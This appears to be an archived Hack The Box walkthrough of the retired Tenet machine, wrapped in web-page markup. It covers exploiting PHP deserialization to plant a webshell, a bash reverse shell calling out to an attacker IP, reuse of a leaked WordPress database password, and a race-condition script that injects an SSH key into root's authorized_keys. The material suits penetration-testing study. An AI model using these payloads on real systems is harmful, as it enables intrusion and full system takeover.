@@ -1,0 +1,456 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+f:I[6025,[],"OutletBoundary"]
+10:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-tenet-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Tenet Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Tenet machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T11:06:01.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[13," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-tenet-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Tenet machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Tenet machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/tenet","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/12a953ec6a15f997aafcb65238957b24b05b25d4/HTB-Tenet.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 12a953ec6a15",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Tenet",""," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/tenet","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7"]]}],"$L8"]}]]}],"$L9"]}],"$La","$Lb"],null,"$Lc"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Tenet machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+d:T65d5,
+<p><strong>Machine:</strong> Tenet<br /><strong>Platform:</strong> Hack The Box<br /><strong>IP:</strong> <code>10.129.2.149</code><br /><strong>Difficulty:</strong> Medium<br /><strong>Path:</strong> PHP Deserialization → Credential Reuse → Race Condition</p>
+<hr />
+
+
+
+<h2 id="1-initial-reconnaissance">1. Initial Reconnaissance</h2>
+<h3 id="what-we-do">What we do:</h3>
+<p>Every penetration test begins with reconnaissance. We need to understand what services are running, what ports are open, and what the attack surface looks like.</p>
+<pre><code class="language-bash" data-language="bash">nmap -sS -sC -sV -p- 10.129.2.149
+</code></pre>
+<p>Or a faster version:</p>
+<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.2.149
+nmap -p 22,80 -sC -sV 10.129.2.149
+</code></pre>
+<h3 id="results">Results:</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</code></pre>
+<h3 id="hacker-mindset">Hacker Mindset:</h3>
+<blockquote>
+<p>"Two ports. SSH and HTTP. SSH is usually a dead end without credentials, so we focus on HTTP first. Web applications are the largest attack surface on most machines. The Apache version tells us it's likely Ubuntu 18.04 Bionic — this might be useful later if we need to know what packages or kernel versions to expect."</p>
+</blockquote>
+<p><strong>Key insight:</strong> SSH without credentials is a brick wall. HTTP is where we'll find our foothold.</p>
+<hr />
+<h2 id="2-web-enumeration-and-the-vhost-problem">2. Web Enumeration &amp; The Vhost Problem</h2>
+<h3 id="what-we-do-2">What we do:</h3>
+<p>We visit the IP directly in a browser or with curl:</p>
+<pre><code class="language-bash" data-language="bash">curl -s http://10.129.2.149/ | head
+</code></pre>
+<p>We see the <strong>Apache2 Ubuntu Default Page</strong>. This means the server is hosting something, but the default vhost is just a placeholder.</p>
+<h3 id="directory-enumeration">Directory Enumeration:</h3>
+<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.2.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php
+</code></pre>
+<h3 id="results-2">Results:</h3>
+<ul>
+<li><code>/users.txt</code> — contains just the word "Success"</li>
+<li><code>/wordpress</code> — a WordPress installation</li>
+</ul>
+<h3 id="the-vhost-problem">The Vhost Problem:</h3>
+<p>When we visit <code>http://10.129.2.149/wordpress/</code>, the page looks broken — CSS is missing, images don't load, links point to <code>tenet.htb</code>.</p>
+<p><strong>Why?</strong> WordPress hardcodes its domain name in the database and configuration. When the server receives a request for the IP address, WordPress generates links for <code>tenet.htb</code>, but our browser can't resolve that domain.</p>
+<h3 id="fix">Fix:</h3>
+<pre><code class="language-bash" data-language="bash">echo "10.129.2.149 tenet.htb" | sudo tee -a /etc/hosts
+</code></pre>
+<p>Now browse to <code>http://tenet.htb</code>.</p>
+<h3 id="hacker-mindset-2">Hacker Mindset:</h3>
+<blockquote>
+<p>"When a site looks broken with missing CSS, that's not a bug — it's a clue. It means the application expects a specific hostname. Always check the page source for hardcoded domains. WordPress is particularly notorious for this. Adding the domain to <code>/etc/hosts</code> is a standard step in web penetration testing."</p>
+</blockquote>
+<hr />
+<h2 id="3-finding-sator-php-and-its-backup">3. Finding sator.php and Its Backup</h2>
+<h3 id="what-we-do-3">What we do:</h3>
+<p>We browse the WordPress site. There's a post called "Migration" with an interesting comment from a user named <strong>neil</strong>:</p>
+<blockquote>
+<p>"did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!"</p>
+</blockquote>
+<h3 id="key-intelligence-extracted">Key Intelligence Extracted:</h3>
+<ol>
+<li>A username: <strong><code>neil</code></strong></li>
+<li>A file named <strong><code>sator.php</code></strong></li>
+<li>There is a <strong>backup</strong> of this file</li>
+</ol>
+<h3 id="searching-for-sator-php">Searching for sator.php:</h3>
+<p>We check both the IP and the vhost:</p>
+<pre><code class="language-bash" data-language="bash">curl -s http://tenet.htb/sator.php        # 404 Not Found
+curl -s http://10.129.2.149/sator.php     # Found!
+</code></pre>
+<p>Output:</p>
+<pre><code>[+] Grabbing users from text file &lt;br&gt;
+[] Database updated &lt;br&gt;
+</code></pre>
+<h3 id="finding-the-backup">Finding the Backup:</h3>
+<p>Neil mentioned a backup. Common backup extensions: <code>.bak</code>, <code>.backup</code>, <code>.old</code>, <code>.swp</code>, <code>~</code>.</p>
+<pre><code class="language-bash" data-language="bash">curl -s http://10.129.2.149/sator.php.bak
+</code></pre>
+<p><strong>Jackpot.</strong> We get the full PHP source code.</p>
+<h3 id="hacker-mindset-3">Hacker Mindset:</h3>
+<blockquote>
+<p>"Comments on blog posts are goldmines. Developers and users reveal internal file names, usernames, and architecture details all the time. The mention of a 'backup' is a massive red flag — developers often leave backup files on web servers, and these files usually aren't parsed by the web server, meaning we get to read the raw source code. Always check for backup files when you find an interesting endpoint. Also notice that <code>sator.php</code> exists on the IP but not the vhost — this suggests different virtual host configurations or a forgotten file."</p>
+</blockquote>
+<hr />
+<h2 id="4-understanding-php-object-injection">4. Understanding PHP Object Injection</h2>
+<h3 id="the-vulnerable-code-sator-php-bak">The Vulnerable Code (sator.php.bak):</h3>
+<pre><code class="language-php" data-language="php">&lt;?php
+class DatabaseExport
+{
+    public $user_file = 'users.txt';
+    public $data = '';
+
+    public function update_db()
+    {
+        echo '[+] Grabbing users from text file &lt;br&gt;';
+        $this-&gt;data = 'Success';
+    }
+
+    public function __destruct()
+    {
+        file_put_contents(__DIR__ . '/' . $this-&gt;user_file, $this-&gt;data);
+        echo '[] Database updated &lt;br&gt;';
+    }
+}
+
+$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app-&gt;update_db();
+?&gt;
+</code></pre>
+<h3 id="breaking-down-the-vulnerability">Breaking Down the Vulnerability:</h3>
+<h4 id="what-is-serialization">What is Serialization?</h4>
+<p>In programming, <strong>serialization</strong> is the process of converting an object (a data structure in memory) into a format that can be stored or transmitted. <strong>Deserialization</strong> is the reverse — converting that stored format back into an object in memory.</p>
+<p>In PHP, you serialize an object like this:</p>
+<pre><code class="language-php" data-language="php">$object = new DatabaseExport;
+echo serialize($object);
+// Output: O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:0:"";}
+</code></pre>
+<h4 id="the-danger-unserialize-on-user-input">The Danger: <code>unserialize()</code> on User Input</h4>
+<p>The code takes user input (<code>$_GET['arepo']</code>) and passes it directly to <code>unserialize()</code>:</p>
+<pre><code class="language-php" data-language="php">$input = $_GET['arepo'] ?? '';
+$databaseupdate = unserialize($input);
+</code></pre>
+<p>This means <strong>we control what object is created in memory</strong>.</p>
+<h4 id="the-magic-method-destruct">The Magic Method: <code>__destruct()</code></h4>
+<p>PHP has "magic methods" that are called automatically under certain conditions. <code>__destruct()</code> is called when an object is destroyed (at the end of the script, or when it goes out of scope).</p>
+<p>Look at what <code>__destruct()</code> does:</p>
+<pre><code class="language-php" data-language="php">public function __destruct()
+{
+    file_put_contents(__DIR__ . '/' . $this-&gt;user_file, $this-&gt;data);
+}
+</code></pre>
+<p>It writes <code>$this-&gt;data</code> to <code>$this-&gt;user_file</code>.</p>
+<h4 id="the-attack">The Attack:</h4>
+<p>Since we control the serialized object, we can:</p>
+<ol>
+<li>Create a <code>DatabaseExport</code> object</li>
+<li>Set <code>$user_file</code> to any filename we want (e.g., <code>shell.php</code>)</li>
+<li>Set <code>$data</code> to any content we want (e.g., a PHP webshell)</li>
+<li>Serialize it and send it to <code>sator.php?arepo=...</code></li>
+<li>When the script ends, PHP destroys our object, calling <code>__destruct()</code></li>
+<li><code>__destruct()</code> writes our malicious data to our chosen filename</li>
+</ol>
+<h3 id="hacker-mindset-4">Hacker Mindset:</h3>
+<blockquote>
+<p>"The moment you see <code>unserialize()</code> with user-controlled input, your brain should scream 'PHP Object Injection.' This is a classic vulnerability. The <code>__destruct()</code> method is our weapon — it's called automatically, and it performs a dangerous action (writing to a file). We don't need to execute code directly; we just need to craft an object that, when destroyed, does something useful for us. This is called a 'POP chain' (Property-Oriented Programming) — we're chaining object properties to achieve code execution."</p>
+</blockquote>
+<hr />
+<h2 id="5-exploiting-deserialization-to-get-a-webshell">5. Exploiting Deserialization to Get a Webshell</h2>
+<h3 id="crafting-the-payload">Crafting the Payload:</h3>
+<p>We create a PHP script to generate the serialized object:</p>
+<pre><code class="language-php" data-language="php">&lt;?php
+class DatabaseExport {
+    public $user_file = "shell.php";
+    public $data = '&lt;?php system($_REQUEST["cmd"]); ?&gt;';
+}
+
+$sploit = new DatabaseExport;
+echo urlencode(serialize($sploit));
+?&gt;
+</code></pre>
+<p>Or as a one-liner:</p>
+<pre><code class="language-bash" data-language="bash">php -r 'class DatabaseExport { public $user_file = "shell.php"; public $data = "&lt;?php system(\$_REQUEST[\"cmd\"]); ?&gt;"; } echo urlencode(serialize(new DatabaseExport));'
+</code></pre>
+<p>Output:</p>
+<pre><code>O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A34%3A%22%3C%3Fphp+system%28%24_REQUEST%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D
+</code></pre>
+<h3 id="triggering-the-exploit">Triggering the Exploit:</h3>
+<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.2.149/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A4%3A%22data%22%3Bs%3A34%3A%22%3C%3Fphp+system%28%24_REQUEST%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D"
+</code></pre>
+<p>Expected output:</p>
+<pre><code>[+] Grabbing users from text file &lt;br&gt;
+[] Database updated &lt;br&gt;[] Database updated &lt;br&gt;
+</code></pre>
+<p>Notice <code>Database updated</code> appears <strong>twice</strong> — once for the <code>$app</code> object created in the script, and once for our injected object.</p>
+<h3 id="verifying-the-webshell">Verifying the Webshell:</h3>
+<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.2.149/shell.php?cmd=id"
+</code></pre>
+<p>Output:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3 id="hacker-mindset-5">Hacker Mindset:</h3>
+<blockquote>
+<p>"We're not just blindly throwing exploits. We verify each step. The webshell gives us command execution, but it's fragile — every command requires an HTTP request. We use it as a stepping stone to get a proper interactive shell. The <code>id</code> command confirms we're <code>www-data</code>, the Apache user. This is expected and means we need to escalate privileges."</p>
+</blockquote>
+<hr />
+<h2 id="6-from-webshell-to-reverse-shell">6. From Webshell to Reverse Shell</h2>
+<h3 id="why-we-need-a-reverse-shell">Why We Need a Reverse Shell:</h3>
+<p>A webshell is clumsy. We can't:</p>
+<ul>
+<li>Use interactive commands (like <code>su</code>, <code>vim</code>, or <code>bash</code>)</li>
+<li>See output from long-running commands easily</li>
+<li>Navigate the filesystem efficiently</li>
+</ul>
+<p>A <strong>reverse shell</strong> gives us a direct network connection where we can interact with the target's shell.</p>
+<h3 id="setting-up-the-listener">Setting Up the Listener:</h3>
+<p>On our Kali machine:</p>
+<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+</code></pre>
+<p>This tells Netcat to <strong>listen</strong> on port 4444, <strong>verbosely</strong>, and not resolve DNS.</p>
+<h3 id="triggering-the-reverse-shell">Triggering the Reverse Shell:</h3>
+<p>We use the webshell to execute a bash reverse shell:</p>
+<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.2.149/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.6%2F4444%200%3E%261%27"
+</code></pre>
+<p>Or in plain English, the command being executed on the server is:</p>
+<pre><code class="language-bash" data-language="bash">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1'
+</code></pre>
+<h3 id="how-the-reverse-shell-works">How the Reverse Shell Works:</h3>
+<ul>
+<li><code>bash -i</code> starts an interactive bash shell</li>
+<li><code>&gt;&amp; /dev/tcp/10.10.14.6/4444</code> redirects stdout and stderr to a TCP connection to our machine</li>
+<li><code>0&gt;&amp;1</code> redirects stdin to the same TCP connection</li>
+</ul>
+<p>The result: the target's bash shell is piped over the network to our Netcat listener.</p>
+<h3 id="upgrading-the-shell">Upgrading the Shell:</h3>
+<p>When we first catch the shell, it's basic — no job control, no command history, no clear screen.</p>
+<pre><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
+</code></pre>
+<p>Then:</p>
+<ol>
+<li>Press <code>Ctrl+Z</code> to background the shell</li>
+<li>On Kali: <code>stty raw -echo; fg</code></li>
+<li>Type <code>reset</code> and press Enter</li>
+<li>If asked for terminal type, type <code>xterm</code></li>
+</ol>
+<h3 id="hacker-mindset-6">Hacker Mindset:</h3>
+<blockquote>
+<p>"A reverse shell is about creating a persistent communication channel. The webshell is a door; the reverse shell is a hallway we can walk through. Upgrading to a PTY (pseudo-terminal) is crucial — many privilege escalation techniques require an interactive shell. Without it, <code>su</code>, <code>sudo</code>, and many other tools won't work properly."</p>
+</blockquote>
+<hr />
+<h2 id="7-privilege-escalation-to-user-neil">7. Privilege Escalation to User (Neil)</h2>
+<h3 id="enumeration-as-www-data">Enumeration as www-data:</h3>
+<p>Now that we have a shell, we look around:</p>
+<pre><code class="language-bash" data-language="bash">ls /home
+# Output: neil
+</code></pre>
+<p>One user: <code>neil</code>.</p>
+<h3 id="finding-credentials">Finding Credentials:</h3>
+<p>WordPress stores database credentials in <code>wp-config.php</code>. Since WordPress is running on this server, let's check:</p>
+<pre><code class="language-bash" data-language="bash">grep -A2 "DB_PASSWORD" /var/www/html/wordpress/wp-config.php
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-php" data-language="php">define( 'DB_USER', 'neil' );
+define( 'DB_PASSWORD', 'Opera2112' );
+</code></pre>
+<h3 id="credential-reuse">Credential Reuse:</h3>
+<p>People reuse passwords. The database password is REDACTED likely Neil's user password too.</p>
+<pre><code class="language-bash" data-language="bash">su - neil
+# Password: null
+</code></pre>
+<p>Success! Now we're <code>neil</code>.</p>
+<h3 id="grab-the-user-flag">Grab the User Flag:</h3>
+<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+# 822953[redacted]5e17618d
+</code></pre>
+<h3 id="hacker-mindset-7">Hacker Mindset:</h3>
+<blockquote>
+<p>"Credential reuse is one of the most common and effective privilege escalation techniques. Developers and administrators often use the same password across multiple services. WordPress config files, database configuration files, and environment files are the first places to check for passwords. When you find a password, always try it for SSH, <code>su</code>, and sudo. The path of least resistance is using what you already have."</p>
+</blockquote>
+<hr />
+<h2 id="8-privilege-escalation-to-root-race-condition">8. Privilege Escalation to Root (Race Condition)</h2>
+<h3 id="checking-sudo-privileges">Checking sudo Privileges:</h3>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p>Output:</p>
+<pre><code>User neil may run the following commands on tenet:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
+</code></pre>
+<p>Neil can run <code>/usr/local/bin/enableSSH.sh</code> as <strong>root without a password</strong>.</p>
+<h3 id="analyzing-the-script">Analyzing the Script:</h3>
+<pre><code class="language-bash" data-language="bash">cat /usr/local/bin/enableSSH.sh
+</code></pre>
+<p>Full script:</p>
+<pre><code class="language-bash" data-language="bash">#!/bin/bash
+
+checkAdded() {
+    sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+    if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+        /bin/echo "Successfully added $sshName to authorized_keys file!"
+    else
+        /bin/echo "Error in adding $sshName to authorized_keys file!"
+    fi
+}
+
+checkFile() {
+    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+        /bin/echo "Error in creating key file!"
+        if [[ -f $1 ]]; then /bin/rm $1; fi
+        exit 1
+    fi
+}
+
+addKey() {
+    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+    (umask 110; touch $tmpName)
+    /bin/echo $key &gt;&gt;$tmpName
+    checkFile $tmpName
+    /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+    /bin/rm $tmpName
+}
+
+key="ssh-rsa [redacted encoded lab material] root@ubuntu"
+addKey
+checkAdded
+</code></pre>
+<h3 id="understanding-the-script-s-logic">Understanding the Script's Logic:</h3>
+<ol>
+<li><code>mktemp -u /tmp/ssh-XXXXXXXX</code> — generates a random filename like <code>/tmp/ssh-a1B2c3D4</code></li>
+<li><code>touch $tmpName</code> — creates the empty file (with umask 110 = permissions 666, so anyone can read/write)</li>
+<li><code>/bin/echo $key &gt;&gt;$tmpName</code> — appends the hardcoded SSH public key to the temp file</li>
+<li><code>checkFile $tmpName</code> — verifies the file exists and has content</li>
+<li><code>/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys</code> — appends the temp file to root's authorized keys</li>
+<li><code>/bin/rm $tmpName</code> — deletes the temp file</li>
+</ol>
+<h3 id="the-vulnerability-race-condition">The Vulnerability: Race Condition</h3>
+<p>A <strong>race condition</strong> occurs when the behavior of a system depends on the relative timing of events — specifically, when one process is supposed to complete actions in a sequence, but another process can interfere between those actions.</p>
+<p>In this script:</p>
+<ul>
+<li>The file is created (step 2)</li>
+<li>The hardcoded key is written (step 3)</li>
+<li>The file is copied to authorized_keys (step 5)</li>
+<li>The file is deleted (step 6)</li>
+</ul>
+<p><strong>The race window is between step 3 and step 5.</strong> If we can overwrite the temp file with <strong>our own SSH public key</strong> after the hardcoded key is written but before the file is copied, then <strong>our key</strong> gets appended to <code>/root/.ssh/authorized_keys</code> instead!</p>
+<h3 id="why-this-works">Why This Works:</h3>
+<ul>
+<li>The file is created in <code>/tmp</code> with permissions <code>666</code> (world-writable)</li>
+<li>We (as <code>neil</code>) have permission to write to it</li>
+<li>The script runs as <code>root</code> via <code>sudo</code></li>
+<li>But the temp file itself is writable by anyone</li>
+</ul>
+<h3 id="preparing-our-ssh-key">Preparing Our SSH Key:</h3>
+<p>On Kali, we generate a new key pair:</p>
+<pre><code class="language-bash" data-language="bash">ssh-keygen -t ed25519 -f ~/.ssh/tenet_root -N ""
+</code></pre>
+<p>View the public key:</p>
+<pre><code class="language-bash" data-language="bash">cat ~/.ssh/tenet_root.pub
+</code></pre>
+<p>Output:</p>
+<pre><code>ssh-ed25519 [redacted encoded lab material] kali@kali
+</code></pre>
+<h3 id="the-attack-racing-the-temp-file">The Attack: Racing the Temp File</h3>
+<p>We need two things happening simultaneously:</p>
+<ol>
+<li><strong>A loop</strong> that constantly overwrites any <code>/tmp/ssh-*</code> file with our public key</li>
+<li><strong>The script</strong> running via <code>sudo</code></li>
+</ol>
+<h4 id="terminal-1-the-race-loop">Terminal 1: The Race Loop</h4>
+<p>We create a Python script that watches <code>/tmp</code> for files starting with <code>ssh-</code> and overwrites them instantly:</p>
+<pre><code class="language-bash" data-language="bash">cat &gt; /tmp/race.py &lt;&lt; 'EOF'
+import os
+key = "ssh-ed25519 [redacted encoded lab material] kali@kali\n"
+while True:
+    for entry in os.scandir("/tmp"):
+        if entry.name.startswith("ssh-") and entry.is_file():
+            with open(entry.path, "w") as fh:
+                fh.write(key)
+EOF
+</code></pre>
+<p>Run multiple instances in parallel for better odds:</p>
+<pre><code class="language-bash" data-language="bash">for i in {1..5}; do python3 /tmp/race.py &amp; done
+</code></pre>
+<h4 id="terminal-2-running-the-script">Terminal 2: Running the Script</h4>
+<p>While the loops are running, we execute the vulnerable script repeatedly:</p>
+<pre><code class="language-bash" data-language="bash">for i in {1..30}; do sudo /usr/local/bin/enableSSH.sh; done
+</code></pre>
+<h3 id="what-happens">What Happens:</h3>
+<ul>
+<li>Most runs will say: <code>Successfully added root@ubuntu to authorized_keys file!</code> (the hardcoded key won)</li>
+<li>Eventually, one run will say: <code>Error in adding root@ubuntu to authorized_keys file!</code> (our key won!)</li>
+</ul>
+<p>The "Error" message is actually <strong>success for us</strong> — it means <code>checkAdded()</code> couldn't find <code>root@ubuntu</code> in <code>authorized_keys</code> because our key (with comment <code>kali@kali</code>) was written instead.</p>
+<h3 id="ssh-as-root">SSH as Root:</h3>
+<p>Once our key is in <code>/root/.ssh/authorized_keys</code>:</p>
+<pre><code class="language-bash" data-language="bash">ssh -i ~/.ssh/tenet_root -o StrictHostKeyChecking=no root@10.129.2.149
+</code></pre>
+<p>We get a root shell:</p>
+<pre><code>root@tenet:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3 id="grab-the-root-flag">Grab the Root Flag:</h3>
+<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+# 1c1baf[redacted]d1ff7fba7
+</code></pre>
+<h3 id="hacker-mindset-8">Hacker Mindset:</h3>
+<blockquote>
+<p>"Race conditions are subtle but powerful. The developer assumed that because they created the file, wrote to it, and then read from it, no one could interfere. But in a multi-user system, files in world-writable directories like <code>/tmp</code> are shared territory. The key insight is: <strong>the file is writable by anyone from the moment it's created until it's deleted.</strong> We don't need to predict the random filename — we just need to be faster than the script. Running multiple parallel watchers increases our odds because the file exists for only milliseconds. This is a classic Time-of-Check to Time-of-Use (TOCTOU) vulnerability."</p>
+</blockquote>
+<hr />
+<h2 id="9-hacker-mindset-summary">9. Hacker Mindset Summary</h2>
+<h3 id="reconnaissance-phase">Reconnaissance Phase</h3>
+<ul>
+<li><strong>Start broad, then narrow.</strong> We scanned all ports, found two services, and focused on HTTP.</li>
+<li><strong>Every broken page is a clue.</strong> The broken WordPress site told us about vhosts.</li>
+<li><strong>Comments are intelligence gold.</strong> Neil's comment gave us usernames, filenames, and the existence of a backup.</li>
+</ul>
+<h3 id="exploitation-phase">Exploitation Phase</h3>
+<ul>
+<li><strong>Source code is the ultimate target.</strong> Finding <code>sator.php.bak</code> gave us the entire attack vector.</li>
+<li><strong>Understand the language.</strong> Knowing PHP magic methods (<code>__destruct</code>) let us recognize the deserialization vulnerability instantly.</li>
+<li><strong>Verify each step.</strong> We checked the webshell with <code>?cmd=id</code> before attempting a reverse shell.</li>
+</ul>
+<h3 id="post-exploitation-phase">Post-Exploitation Phase</h3>
+<ul>
+<li><strong>Config files contain passwords.</strong> <code>wp-config.php</code> is a standard target and delivered Neil's password.</li>
+<li><strong>Credential reuse is real.</strong> The database password was the user password.</li>
+<li><strong>Always check <code>sudo -l</code>.</strong> It revealed our path to root with zero effort.</li>
+<li><strong>Read every script you can run as root.</strong> Understanding <code>enableSSH.sh</code> revealed the race condition.</li>
+<li><strong>World-writable directories are dangerous.</strong> <code>/tmp</code> with permissive umask values is a classic privilege escalation vector.</li>
+</ul>
+<h3 id="general-principles">General Principles</h3>
+<ol>
+<li><strong>Be methodical.</strong> Don't skip steps. Each piece of information builds on the last.</li>
+<li><strong>Think like the developer.</strong> They left a backup, they reused passwords, they didn't secure <code>/tmp</code> — these are human mistakes.</li>
+<li><strong>Persistence beats brilliance.</strong> The race condition required multiple attempts. Many exploits fail the first time.</li>
+<li><strong>Minimize your footprint.</strong> Use simple tools (curl, Python, bash) that don't require uploading large binaries.</li>
+<li><strong>Chain vulnerabilities.</strong> No single vulnerability gave us root. We chained: deserialization → credential reuse → race condition.</li>
+</ol>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>user.txt</td>
+<td><code>8229530[redacted]e17618d</code></td>
+</tr>
+<tr>
+<td>root.txt</td>
+<td><code>1c1baf2[redacted]1ff7fba7</code></td>
+</tr>
+</tbody></table>
+<hr />
+<p><em>Walkthrough completed. Happy hacking!</em></p>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
